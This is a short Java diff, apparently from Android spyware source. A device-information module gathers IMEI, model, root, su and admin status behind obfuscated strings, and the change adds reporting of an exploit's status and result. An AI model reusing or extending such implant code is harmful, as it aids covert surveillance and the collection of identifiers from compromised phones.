@@ -126,7 +126,7 @@ public class ModuleDevice extends BaseInstantModule {
 			
 			sb.insert(0, M.e("Model:") + Build.DISPLAY + "\n");
 			sb.insert(0, M.e("IMEI: ") + Device.self().getImei() + "\n");
-			sb.insert(0, M.e("Root: ") + (root?"yes":"no") + " " 
+			sb.insert(0, M.e("Root: ") + (root?"yes":"no") + ", status="+Status.getExploitStatusString()+", result="+Status.getExploitResultString()
 					+ M.e(", Su: ") + (su?"yes":"no")  + " "
 					+ M.e(", Admin: ") + (admin?"yes":"no") + "\n");
 			sb.insert(0, M.e("Free space: ") + freeSpace + " KB" + "\n");
